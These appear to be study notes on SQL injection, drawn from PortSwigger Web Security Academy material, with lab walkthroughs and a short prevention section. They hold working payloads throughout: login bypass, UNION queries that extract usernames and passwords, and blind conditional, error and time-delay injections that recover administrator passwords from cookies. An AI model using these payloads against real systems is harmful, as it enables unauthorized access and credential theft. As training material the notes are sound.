
- The attacker executes arbitrary SQL commands by supplying malicious input inserted into a SQL statement.

- The input is incorrectly filtered or escaped.

- It can lead to authentication bypass, sensitive data leaks, tampering of the database and RCE in some cases.


#### Types of SQL injections:

- **Classic SQLi**: each query returns a table or other content that can be easily read
- **Blind SQLi**: each query returns a boolean result:
	- conditional responses
	- conditional errors
	- conditional time delays
- **First-order SQLi**: the query is executed with the malicious content while processing the request
- **Second-order SQLi**: the malicious content is stored and later used in a query, that is while processing another request
- **In-band SQLi**: the attack is carried on the backend server alone
- **Out-of-band SQLi**: the attack triggers interaction with an attacker server

## SQL injection examples

### Retrieving hidden data

Imagine a shopping application that displays products in different categories. When the user clicks on the **Gifts** category, their browser requests the URL:

```
https://insecure-website.com/products?category=Gifts
```

This causes the application to make a SQL query to retrieve details of the relevant products from the database:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

The restriction `released = 1` is being used to hide products that are not released. We could assume for unreleased products, `released = 0`.

The application doesn't implement any defenses against SQL injection attacks. This means an attacker can construct the following attack, for example:

```
https://insecure-website.com/products?category=Gifts'--
```

This results in the SQL query:

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

Crucially, note that `--` is a comment indicator in SQL. This means that the rest of the query is interpreted as a comment, effectively removing it. In this example, this means the query no longer includes `AND released = 1`. As a result, all products are displayed, including those that are not yet released.

You can use a similar attack to cause the application to display all the products in any category, including categories that they don't know about:

```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

This results in the SQL query:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

The modified query returns all items where either the `category` is `Gifts`, or `1` is equal to `1`. As `1=1` is always true, the query returns all items.

###### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

Change the URL with the filter category in this way:

```
https://0a50002c04d38b4680703f7700a10062.web-security-academy.net/filter?category=Gifts' OR 1=1--
```

### Subverting application logic

Imagine an application that lets users log in with a username and password. If a user submits the username `wiener` and the password `bluecheese`, the application checks the credentials by performing the following SQL query:

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

If the query returns the details of a user, then the login is successful. Otherwise, it is rejected.

In this case, an attacker can log in as any user without the need for a password. They can do this using the SQL comment sequence `--` to remove the password check from the `WHERE` clause of the query. For example, submitting the username `administrator'--` and a blank password results in the following query:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

This query returns the user whose `username` is `administrator` and successfully logs the attacker in as that user.

###### Lab: SQL injection vulnerability allowing login bypass

Login by injecting the following username: `administrator'--`. By doing so, we can login as administrator

### Retrieving data from other database tables

#### SQL injection UNION attacks

In cases where the application responds with the results of a SQL query, an attacker can use a SQL injection vulnerability to retrieve data from other tables within the database. You can use the `UNION` keyword to execute an additional `SELECT` query and append the results to the original query.

For example, if an application executes the following query containing the user input `Gifts`:

`SELECT name, description FROM products WHERE category = 'Gifts'`

An attacker can submit the input:

`' UNION SELECT username, password FROM users--`

This causes the application to return all usernames and passwords along with the names and descriptions of products.

##### Requirements

For a `UNION` query to work, two key requirements must be met:

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

This normally involves finding out:

- How many columns are being returned from the original query.
- Which columns returned from the original query are of a suitable data type to hold the results from the injected query.

##### Determining the number of columns required

When you perform a SQL injection UNION attack, there are two effective methods to determine how many columns are being returned from the original query.

###### Method 1

One method involves injecting a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs. For example, if the injection point is a quoted string within the `WHERE` clause of the original query, you would submit:

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

This series of payloads modifies the original query to order the results by different columns in the result set. The column in an `ORDER BY` clause can be specified by its index, so you don't need to know the names of any columns. When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as:

`The ORDER BY position number 3 is out of range of the number of items in the select list.`

The application might actually return the database error in its HTTP response, but it may also issue a generic error response. In other cases, it may simply return no results at all. Either way, as long as you can detect some difference in the response, you can infer how many columns are being returned from the query.

###### Method 2

The second method involves submitting a series of `UNION SELECT` payloads specifying a different number of null values:

```sql
' UNION SELECT NULL-- 
' UNION SELECT NULL,NULL-- 
' UNION SELECT NULL,NULL,NULL--
```

If the number of nulls does not match the number of columns, the database returns an error, such as:

`All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.`

We use `NULL` as the values returned from the injected `SELECT` query because the data types in each column must be compatible between the original and the injected queries. `NULL` is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.

As with the `ORDER BY` technique, the application might actually return the database error in its HTTP response, but may return a generic error or simply return no results.

###### Lab: SQL injection UNION attack, determining the number of columns returned by the query

- Intercept the filter category request and fuzz on the column index of the `ORDER BY`:

```http
GET https://0a5700b50439296c800aaeaa00dd0021.web-security-academy.net/filter?category=Pets' order by 3 -- HTTP/1.1
```

 or add a union segment at the end of the category parameter and fuzz on the null values:

```http
GET https://0a5700b50439296c800aaeaa00dd0021.web-security-academy.net/filter?category=Pets' union select null, null, null -- HTTP/1.1
```
##### Database-specific syntax

Every **DBMS** has its own specific syntax. Hence, some commands and characters might not work with all the DBMS. For info, check the [[SQL injection cheat sheet]].

##### Finding columns with a useful data type

A SQL injection UNION attack enables you to retrieve the results from an injected query. The interesting data that you want to retrieve is normally in string form. This means you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.

After you determine the number of required columns, you can probe each column to test whether it can hold string data. You can submit a series of `UNION SELECT` payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:

```sql
' UNION SELECT 'a',NULL,NULL,NULL-- 
' UNION SELECT NULL,'a',NULL,NULL-- 
' UNION SELECT NULL,NULL,'a',NULL-- 
' UNION SELECT NULL,NULL,NULL,'a'--
```

If the column data type is not compatible with string data, the injected query will cause a database error, such as:

`Conversion failed when converting the varchar value 'a' to data type int.`

If an error does not occur and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.

###### Lab: SQL injection UNION attack, finding a column containing text

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve data from other tables. To construct such an attack:

- you first need to determine the number of columns returned by the query. You can do this using a technique you learned in the previous lab. 
- The next step is to identify a column that is compatible with string data. To do so, fuzz on the following request until we get a 200 response:

```
GET https://0abb00a1043bfc809480a8ff002e009c.web-security-academy.net/filter?category=Gifts' union select 'abcde', null, null -- HTTP/1.1

GET https://0abb00a1043bfc809480a8ff002e009c.web-security-academy.net/filter?category=Gifts' union select null, 'abcde', null -- HTTP/1.1

GET https://0abb00a1043bfc809480a8ff002e009c.web-security-academy.net/filter?category=Gifts' union select null, null, 'abcde' -- HTTP/1.1
```

### Examining the database in SQL injection attacks

To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:

- The type and version of the database software.
- The tables and columns that the database contains.

#### Querying the database type and version

You can potentially identify both the database type and version by injecting provider-specific queries to see if one works.

The following are some queries to determine the database version for some popular database types:

|   |   |
|---|---|
|Database type|Query|
|Microsoft, MySQL|`SELECT @@version`|
|Oracle|`SELECT * FROM v$version`|
|PostgreSQL|`SELECT version()`|

For example, you could use a `UNION` attack with the following input:

```sql
' UNION SELECT @@version--
```

This might return the following output. In this case, you can confirm that the database is Microsoft SQL Server and see the version used:

```
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64) Mar 18 2018 09:11:49 Copyright (c) Microsoft Corporation Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```

###### Lab: SQL injection attack, querying the database type and version on Oracle

- This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

- Intercept the filter category request and inject the following code:

```http
GET https://0ab4006103e45fac852c30dc003e00ee.web-security-academy.net/filter?category=Pets' union select null from dual -- HTTP/1.1
```

- Fuzz on the number of nulls in the union select to know how many columns the original query accepts.
- Then inject this code:

```http
GET https://0ab4006103e45fac852c30dc003e00ee.web-security-academy.net/filter?category=Pets' union select banner, null from v$version -- HTTP/1.1
```

- Fuzz the banner field on the null values until the request gets a 200 response and the banner (with all the DBMS infos) is displayed.

###### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

- Very similar to the previous lab, except for the syntax to be used.

#### Listing the contents of the database

Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.

For example, you can query `information_schema.tables` to list the tables in the database:

```sql
SELECT * FROM information_schema.tables
```

You can then query `information_schema.columns` to list the columns in individual tables:

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

###### Lab: SQL injection attack, listing the database contents on non-Oracle databases

- Find out the DBMS version by injecting this code:

```http
GET https://0af50001037a8365807a052700e200d7.web-security-academy.net/filter?category=Pets' union select version(), null -- HTTP/1.1
```

- The DBMS used is PostgreSQL!

- Now retrieve all the table names:

```http
GET https://0af50001037a8365807a052700e200d7.web-security-academy.net/filter?category=Pets' union select table_name, null from information_schema.tables -- HTTP/1.1
```

- Then retrieve the column names of the users table just found:

```http
GET https://0af50001037a8365807a052700e200d7.web-security-academy.net/filter?category=Pets' union select column_name, null from information_schema.columns where table_name='users_bnkapd' -- HTTP/1.1
```

- Eventually, retrieve the administrator's username and password:

```http
GET https://0af50001037a8365807a052700e200d7.web-security-academy.net/filter?category=Pets' union select password_lqbril, null from users_bnkapd where username_dfjjlm='administrator' -- HTTP/1.1
```


### Blind SQL injection vulnerabilities

Many instances of SQL injection are blind vulnerabilities. This means that the application does not return the results of the SQL query or the details of any database errors within its responses. Blind vulnerabilities can still be exploited to access unauthorized data, but the techniques involved are generally more complicated and difficult to perform.

The following techniques can be used to exploit blind SQL injection vulnerabilities, depending on the nature of the vulnerability and the database involved:

- You can conditionally trigger an error such as a divide-by-zero.
- You can conditionally trigger a time delay in the processing of the query. This enables you to infer the truth of the condition based on the time that the application takes to respond.
- You can trigger an out-of-band network interaction, using OAST techniques. Often, you can directly exfiltrate data via the out-of-band channel. For example, you can place the data into a DNS lookup for a domain that you control.

#### Exploiting blind SQL injection by triggering conditional responses

Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:

`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`

When a request containing a `TrackingId` cookie is processed, the application uses a SQL query to determine whether this is a known user:

`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`

This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If you submit a recognized `TrackingId`, the query returns data and you receive a "Welcome back" message in the response.

This behavior is enough to be able to exploit the blind SQL injection vulnerability. You can retrieve information by triggering different responses conditionally, depending on an injected condition.

To understand how this exploit works, suppose that two requests are sent containing the following `TrackingId` cookie values in turn:

```
xyz' AND '1'='1 
xyz' AND '1'='2
```

- The first of these values causes the query to return results, because the injected `AND '1'='1` condition is true. As a result, the "Welcome back" message is displayed.
- The second value causes the query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.

This allows us to determine the answer to any single injected condition and extract data one piece at a time.

For example, suppose there is a table called `Users` with the columns `Username` and `Password`, and a user called `Administrator`. You can determine the password for this user by sending a series of inputs to test the password one character at a time.

To do this, start with the following input:

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`

This returns the "Welcome back" message, indicating that the injected condition is true and so the first character of the password is greater than `m`.

Next, we send the following input:

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`

This does not return the "Welcome back" message, indicating that the injected condition is false and so the first character of the password is not greater than `t`.

Eventually, we send the following input, which returns the "Welcome back" message, thereby confirming that the first character of the password is `s`:

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`

We can continue this process to systematically determine the full password for the `Administrator` user.

###### Lab: Blind SQL injection with conditional responses

- Intercept the login request and inject SQL code into the `TrackingId` cookie to find out the administrator password length:

```http
Cookie: TrackingId=aZPBa7MCHpIIrXE7' and (select length(password) from users where username='administrator') = 20 --
```

- Fuzz on the password length and notice some differences between the response sizes

- Then fuzz every single character of the password, with the following code:

```http
Cookie: TrackingId=aZPBa7MCHpIIrXE7' and (select substring(password, 1, 1) from users where username='administrator') = 'a
```

- You should fuzz on the final character `a` and the first number of the `substring` function, which represents the character index.

Final password : **ur9m3kihsz6rnghiuu6y**

#### Error-based SQL injection

Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts.

##### Exploiting blind SQL injection by triggering conditional errors

Some applications carry out SQL queries but their behavior doesn't change, regardless of whether the query returns any data. The technique in the previous section won't work, because injecting different boolean conditions makes no difference to the application's responses.

It's often possible to induce the application to return a different response depending on whether a SQL error occurs. You can modify the query so that it causes a database error only if the condition is true. Very often, an unhandled error thrown by the database causes some difference in the application's response, such as an error message. This enables you to infer the truth of the injected condition.

To see how this works, suppose that two requests are sent containing the following `TrackingId` cookie values in turn:

```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a 
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

These inputs use the `CASE` keyword to test a condition and return a different expression depending on whether the expression is true:

- With the first input, the `CASE` expression evaluates to `'a'`, which does not cause any error.
- With the second input, it evaluates to `1/0`, which causes a divide-by-zero error.

If the error causes a difference in the application's HTTP response, you can use this to determine whether the injected condition is true.

Using this technique, you can retrieve data by testing one character at a time:

```sql
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

###### Lab: Blind SQL injection with conditional errors

- Intercept the login request and inject the following SQL code into the `TrackingId` cookie to find out the administrator password length:

```http
Cookie: TrackingId=irPxy6o9SarScloT' and (SELECT CASE WHEN ((select length(password) from users where username='administrator') = 20) THEN TO_CHAR(1/0) ELSE 'ciao' END FROM dual) = 'ciao
```

- By fuzzing on the password length and checking what request gives us an error (because it tries 1/0 operation), we know the password length (which is 20).

- Now fuzz on the single characters of the password as we did in the previous step:

```http
Cookie: TrackingId=irPxy6o9SarScloT' and (SELECT CASE WHEN ((select substr(password, 1, 1) from users where username='administrator') = 'a') THEN TO_CHAR(1/0) ELSE 'ciao' END FROM dual) = 'ciao
```

- Take all the characters with an error as response and concatenate them. This is the final password: **jgvd3wwry5afz0d6tvzy**

#### Exploiting blind SQL injection by triggering time delays

If the application catches database errors when the SQL query is executed and handles them gracefully, there won't be any difference in the application's response. This means the previous technique for inducing conditional errors will not work.

In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected condition is true or false. As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response. This allows you to determine the truth of the injected condition based on the time taken to receive the HTTP response.

The techniques for triggering a time delay are specific to the type of database being used. For example, on Microsoft SQL Server, you can use the following to test a condition and trigger a delay depending on whether the expression is true:

```sql
'; IF (1=2) WAITFOR DELAY '0:0:10'-- 
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

- The first of these inputs does not trigger a delay, because the condition `1=2` is false.
- The second input triggers a delay of 10 seconds, because the condition `1=1` is true.

Using this technique, we can retrieve data by testing one character at a time:

```sql
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

###### Lab: Blind SQL injection with time delays

- Force a 10 seconds time delay in the login request by injecting this code in the `TrackingId` cookie:

```http
Cookie: TrackingId=UNsNzbMrL6y9mjyF' || pg_sleep(10) --
```


## Prevention

- Use **Prepared statements** (queries are compiled, parameters are assigned to variables or properly escaped)
- Don’t concatenate strings, use well established libraries
- Validate untrusted input (from user, from database, everything out of the trust boundary)
- Use primitive domains for input and output (**DDD**, *Domain Driven Design*)

- **NB**: be aware of automation tools: often you just need to provide a request-raw-file and **sqlmap** will do its magic! Dump databases and possibly open a reverse shell.